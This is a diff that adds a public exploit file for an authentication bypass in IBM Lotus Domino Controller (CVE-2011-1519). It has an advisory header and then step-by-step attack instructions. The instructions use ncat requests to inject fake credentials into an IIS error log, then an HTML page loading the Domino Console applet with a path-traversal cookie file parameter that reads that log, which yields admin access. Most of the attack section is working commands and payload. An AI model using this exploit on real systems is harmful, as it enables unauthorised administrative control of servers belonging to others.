@@ -1,0 +1,73 @@
+# Exploit Title: IBM Lotus Domino Controller auth. bypass
+# Date:30/11/2011
+# Author: Alexey Sintsov
+# Software Link: http://www.ibm.com/
+# Version:8.5.3/8.5.2 FP3 (0day) 
+# Tested on: Windows 7 / Windows 2008
+# CVE : CVE-2011-1519
+
+
+Application: IBM Lotus Domino Controller
+Versions Affected: <=8.5.2 FP3, <=8.5.3
+Manager 4.0 prior to Update 4
+(0day) 
+Vendor URL: http://ibm.com
+Bug: own XML parser  
+CVE: CVE-2011-1519
+CVSS2: 9.0
+Exploits: YES
+Reported:2010-09-23 via ZDI
+Date of Public Advisory: 2011-03-22
+Authors: Alexey Sintsov
+Digital Security Research Group [DSecRG] (research [at] dsecrg [dot]com)
+
+This bug was found by Patrik Karlsson and sold to ZDI. IBM make fix for this bug,
+but not enough. So this sploit can make auth. bypass in Lotus Domino Controller even with patch from IBM. So still 0day.
+Details you can read there: http://dsecrg.com/pages/pub/show.php?id=41
+
+EXPLOIT:
+
+1. Make port-fwd from 127.0.0.1:2050 to REMOTE_TARGET:2050
+2. Inject XML into IIS log file (for an example)
+
+ncat targethost 49152
+GET /<user HTTP/1.0\r\n\r\n
+
+
+ncat targethost 49152
+GET /user="admin"cookie="pass"address="http://twitter/asintsov" HTTP/1.0\r\n\r\n
+
+(\r\n\r\n) ENTER two times 8)
+
+3.Run this from local web-server (dconsole.jar - IBM Lotus Domino Console applet)
+
+<html>
+<body>
+<script>
+function onLoadConsole()
+{
+alert("Connected");
+}
+</script>
+<applet name = "DominoConsole"
+code = "lotus.domino.console.DominoConsoleApplet.class"
+codebase = "http://127.0.0.1/domjava/"
+archive = "dconsole.jar"
+width = "100%"
+height = "99%"
+>
+<PARAM NAME="debug" VALUE="true">
+<PARAM NAME="port" VALUE="2050">
+<PARAM NAME="useraddress" VALUE="http://twitter/asintsov">
+<PARAM NAME="username" VALUE="admin">
+<PARAM NAME="cookiefile" VALUE="\..\..\..\windows\system32\logfiles\httperr\httperr1.log">
+<PARAM NAME="cookievalue" VALUE="pass">
+<PARAM NAME="onLoad" VALUE="onLoadConsole">
+</applet>
+</body>
+</html>
+
+
+
+
+ 
